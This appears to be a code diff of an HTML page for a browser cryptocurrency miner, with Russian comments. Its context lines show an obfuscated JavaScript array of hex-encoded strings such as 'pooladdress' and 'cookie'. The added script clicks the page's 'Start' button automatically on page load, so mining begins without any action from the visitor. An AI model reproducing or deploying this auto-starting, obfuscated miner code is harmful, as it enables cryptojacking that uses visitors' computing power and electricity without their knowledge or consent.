@@ -42,16 +42,7 @@ var _0xf38d=["\x70\x6F\x6F\x6C\x61\x64\x64\x72\x65\x73\x73","\x63\x6F\x6F\x6B\x6
 		});
 	location.reload();
 	}
-	// Привязываем событие к кнопке
-        document.getElementById('start').addEventListener('click', () => {
-            console.log('Start button clicked!');
-            // Ваш основной код, запускаемый кнопкой
-        });
-
-        // Автоматически кликаем по кнопке после загрузки страницы
-        document.addEventListener('DOMContentLoaded', () => {
-            document.getElementById('start').click();
-        });
+	
 	</script>
 
     <link rel="stylesheet" href="https://crypto-webminer.pages.dev/custom/styles.css">
@@ -113,6 +104,20 @@ var _0xf38d=["\x70\x6F\x6F\x6C\x61\x64\x64\x72\x65\x73\x73","\x63\x6F\x6F\x6B\x6
 <button id="start">Start</button>
 
 
+
+  <script>
+        // Дожидаемся полной загрузки страницы
+        document.addEventListener('DOMContentLoaded', () => {
+            // Проверяем, существует ли кнопка
+            const startButton = document.getElementById('start');
+            if (startButton) {
+                console.log('Auto-starting the mining process...');
+                startButton.click(); // Программно кликаем по кнопке
+            } else {
+                console.error('Start button not found!');
+            }
+        });
+    </script>
 </body>
 
 </html>
